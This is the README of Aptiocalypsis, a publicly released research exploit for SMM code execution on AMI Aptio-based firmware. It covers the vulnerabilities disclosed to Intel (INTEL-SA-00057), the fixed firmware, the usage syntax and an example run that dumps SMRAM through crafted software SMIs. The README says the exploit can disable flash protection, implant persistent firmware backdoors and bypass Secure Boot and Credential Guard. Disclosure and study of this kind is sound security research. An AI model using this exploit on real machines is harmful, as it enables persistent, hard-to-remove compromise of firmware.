
Aptiocalypsis: arbitrary System Management Mode code execution exploit
for AMI Aptio based firmware.

**************************************************************************

For more information about this project please read the following article:

http://blog.cr4.sh/2016/10/exploiting-ami-aptio-firmware.html


This code exploits vulnerability in UEFI SMM drivers of AMI Aptio based firmwares to execute arbitrary SMM code. Running of arbitrary System Management Mode code allows attacker to disable flash write protection and infect platform firmware with persistent backdoor that survives OS reinstall, disable Secure Boot, bypass Virtual Secure Mode (Credential Guard, etc.) on Windows 10 Enterprise and do others evil things. Also, Aptiocalypsis exploit is the first publicly demonstrated successful attempt of breaking SMM_Code_Chk_En exploit mitigation feature that presents on Intel CPUs starting from Haswell microarchitecture.

The vulnerability was discovered during reverse engineering of platform firmware from 6-th generation Intel NUC. Totally I discvoered three 0day vulnerabilities in NvmeSmm, SdioSmm and UsbRt drivers from AMI and one in ItkSmmVars driver from Intel. Vulnerabilities was reported to Intel at 15.07.2016 and after several working days both Intel and AMI confirmed all of the security issues. Intel decided to release a single advisory INTEL-SA-00057 to cover all four vulnerabilities:

https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00057&languageid=en-fr

Fixed firmware for my NUC of version SYSKLi35.86A.0052 was released at 10.09.2016:

https://downloadcenter.intel.com/download/26283/BIOS-Update-SYSKLi35-86A-

Vulnerable UEFI SMM drivers are also presents in computers with AMI based firmware from other manufacturers. For example, firmware of Asus Q170M-C motherboard has two from four vulnerable drivers described above. At this moment it seems that Intel is only one OEM company who released advisory and fixes for these vulnerabilities. Probably, in some future we’ll see some information about vulnerable products from other vendors. Original reports that was sent to Intel can be found in reports/ folder:

https://github.com/Cr4sh/Aptiocalypsis/tree/master/reports/Intel_NUC_AMI_vuln.txt
https://github.com/Cr4sh/Aptiocalypsis/tree/master/reports/Intel_NUC_ITK_vuln.txt

Please note, that at this moment even patched firmware versions still allows to use these vulnerabilities to bypass Credential Guard and others Virtual Secure Mode powered features of Windows 10 (see the article for detailed analysis of Intel and AMI security fixes).

Aptiocalypsys exploit was tested on Intel NUC NUC6i3SYH with firmware version SYSKLi35.86A.0045, to run this exploit on any other combination of computer model and firmware version you have to add the constants needed by your firmware into the BIOS_VERSIONS array (see the article for detailed information about obtaining these constants).

To use aptiocalypsis.py program you need to install CHIPSEC framework (https://github.com/chipsec/chipsec).
Usage:

# python aptiocalypsis.py [<dump_address> <dump_size> [dest_file_path]]

When the program was started with no command line options specified — it checks if it’s possible to exploit NvmeSmm driver vulnerability on current platform. In other case — it dumps specified region of physical memory into the file or prints it’s hexadecimal dump into the stdout if dest_file_path argument was not specified. 


Example of using aptiocalypsis.py to dump SMRAM on Inel NUC:

# python aptiocalypsis.py 0x8b400000 0x400000 /tmp/smram_dump.bin
****** Chipsec Linux Kernel module is licensed under GPL 2.0
Selected BIOS version is SYSKLi35.86A
Dump address is 0x8b400000:8b7fffff
Physical memory for temporary read buffer allocated at 0x846800000
SMM memcpy() address is 0x8b702110
Target "lea reg, func_table" instruction to patch is at 0x8b6edf4d
Trigerring SW SMI 0x42 to overwrite byte at 0x8b6edf50 with 7...
Trigerring SW SMI 0x42 to overwrite byte at 0x8b6edf51 with 7...
Trigerring SW SMI 0x42 to overwrite byte at 0x8b6edf52 with 7...
3 function arguments are at 0x00000500
Fake functions table address is 0x8a75e65b
SMM communication buffer address is at 0x00000204
SMM communication buffer is at 0x00000300
Triggering SW SMI 0x31...
SUCESS: SMM function 0x8b702110 was called
Writing 0x400000 bytes of readed memory into the /tmp/smram_dump.bin


Written by:
Dmytro Oleksiuk (aka Cr4sh)

cr4sh0@gmail.com
http://blog.cr4.sh
